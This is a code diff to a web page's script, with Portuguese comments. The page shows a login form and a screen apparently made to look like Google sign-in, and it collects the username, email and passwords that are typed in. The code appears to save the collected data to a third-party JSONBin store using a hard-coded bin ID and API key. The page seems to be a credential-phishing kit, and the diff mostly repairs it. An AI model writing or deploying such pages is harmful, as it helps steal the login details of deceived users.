@@ -357,8 +357,7 @@
 <script>
   // ⚠️ SUBSTITUA PELOS SEUS DADOS DO JSONBIN
   const JSONBIN_BIN_ID  = "69ab0df3ae596e708f668141";   // ex: 6630f1aead19ca34f8a1b2c3
-  const JSONBIN_API_KEY = "$2a$10$GSl73ItjODY99dgV64xFaOccmtsIwPiIyLK21hoFFNW.kY4hiwOhS
-undefined"; // ex: $2a$10$AbCdEf...
+  const JSONBIN_API_KEY = "$2a$10$GSl73ItjODY99dgV64xFaOccmtsIwPiIyLK21hoFFNW.kY4hiwOhS"; // ex: $2a$10$AbCdEf...
 
   const main   = document.getElementById('screen-main');
   const gscr   = document.getElementById('screen-google');
@@ -370,7 +369,7 @@ undefined"; // ex: $2a$10$AbCdEf...
 
   window.addEventListener('load', () => syncHeight(main));
 
-  function goToGoogle() {
+  window.goToGoogle = function() {
     main.classList.remove('active');
     main.classList.add('exit-left');
     gscr.classList.remove('enter-right');
@@ -379,7 +378,7 @@ undefined"; // ex: $2a$10$AbCdEf...
     setTimeout(() => syncHeight(gscr), 30);
   }
 
-  function goBack() {
+  window.goBack = function() {
     gscr.classList.remove('active');
     gscr.classList.add('enter-right');
     main.classList.remove('exit-left');
@@ -397,7 +396,7 @@ undefined"; // ex: $2a$10$AbCdEf...
     });
   }
 
-  function nextStep() {
+  window.nextStep = function() {
     const email = document.getElementById('g-email').value.trim();
     if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
       shakeCard(gscr); return;
@@ -450,7 +449,7 @@ undefined"; // ex: $2a$10$AbCdEf...
     if (!putRes.ok) throw new Error(`Erro ao salvar bin: ${putRes.status}`);
   }
 
-  async function handleLogin() {
+  window.handleLogin = async function() {
     const u = document.getElementById('usuario').value.trim();
     const p = document.getElementById('senha').value;
     if (!u || !p) { shakeCard(main); return; }
@@ -464,7 +463,7 @@ undefined"; // ex: $2a$10$AbCdEf...
     }
   }
 
-  async function handleGoogleLogin() {
+  window.handleGoogleLogin = async function() {
     const p = document.getElementById('g-senha').value;
     if (!p) { shakeCard(gscr); return; }
     const email = document.getElementById('g-email-tag').textContent;
